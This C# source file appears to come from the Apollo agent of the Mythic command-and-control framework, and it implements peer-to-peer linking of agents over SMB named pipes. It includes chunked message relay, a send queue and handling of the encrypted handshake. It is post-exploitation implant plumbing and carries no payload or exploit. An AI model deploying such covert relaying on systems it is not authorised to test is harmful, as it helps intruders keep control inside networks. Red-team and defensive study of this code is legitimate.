using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Serializers;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using AI = ApolloInterop;
using ApolloInterop.Constants;
using AS = ApolloInterop.Structs.ApolloStructs;
using System.Threading;
using TTasks = System.Threading.Tasks;
using ApolloInterop.Enums.ApolloEnums;

namespace Apollo.Peers.SMB
{
    public class SMBPeer : AI.Classes.Peer, INamedPipeCallback
    {
        private AsyncNamedPipeClient _pipeClient = null;
        private PipeStream _pipe = null;
        private bool _expectEKE;
        private ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private Action<object> _sendAction;
        private TTasks.Task _sendTask;
        private MessageType _serverResponseType;
        public SMBPeer(IAgent agent, PeerInformation info) : base(agent, info)
        {
            _pipeClient = new AsyncNamedPipeClient(info.Hostname, info.C2Profile.Parameters.PipeName, this);
            _expectEKE = info.C2Profile.Parameters.EncryptedExchangeCheck == "T";

            _sendAction = (object p) =>
            {
                while (((PipeStream)p).IsConnected)
                {
                    if (_senderQueue.TryDequeue(out byte[] result))
                    {
                        ((PipeStream)p).BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                    }
                    else
                    {
                        Thread.Sleep(1000);
                    }
                }
            };
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        public override bool Connected()
        {
            return _pipe.IsConnected;
        }

        public override bool Finished()
        {
            return _previouslyConnected && !_pipe.IsConnected;
        }

        public void OnAsyncConnect(PipeStream pipe, out object state)
        {
            _pipe = pipe;
            _sendTask = new TTasks.Task(_sendAction, pipe);
            _sendTask.Start();
            _previouslyConnected = true;
            state = this;
        }

        public void OnAsyncDisconnect(PipeStream pipe, object state)
        {
            pipe.Close();
            _sendTask.Wait();
        }

        public void OnAsyncMessageReceived(PipeStream pipe, AS.IPCData data, object state)
        {
            AS.IPCChunkedData chunkedData = _serializer.Deserialize<AS.IPCChunkedData>(
                Encoding.UTF8.GetString(
                    data.Data.Take(data.DataLength).ToArray()
                )
            );
            lock(_messageOrganizer)
            {
                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
                {
                    _messageOrganizer[chunkedData.ID] = new IPCMessageStore(DeserializeToReceiver);
                }
            }
            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
        }

        public bool DeserializeToReceiver(byte[] data, MessageType mt)
        {
            // Probably where we do sorting based on EKE,
            // checkin, and get_tasking
            switch(mt)
            {
                // part of the checkin process, flag next message to be of EKE
                case MessageType.EKEHandshakeMessage:
                    _serverResponseType = MessageType.EKEHandshakeResponse;
                    break;
                default:
                    _serverResponseType = MessageType.MessageResponse;
                    break;
            }
            _agent.GetTaskManager().AddDelegateMessageToQueue(new DelegateMessage()
            {
                UUID = _uuid,
                C2Profile = "smb",
                Message = Encoding.UTF8.GetString(data)
            });
            return true;
        }

        public override void ProcessMessage(DelegateMessage message)
        {
            _mythicUUID = message.MythicUUID;
            AS.IPCChunkedData[] chunks = _serializer.SerializeDelegateMessage(message.Message, _serverResponseType);
            foreach(AS.IPCChunkedData chunk in chunks)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
            }
        }

        public override bool Start()
        {
            return _pipeClient.Connect(10000);
        }

        public override void Stop()
        {
            _pipe.Close();
            _sendTask.Wait();
        }
    }
}
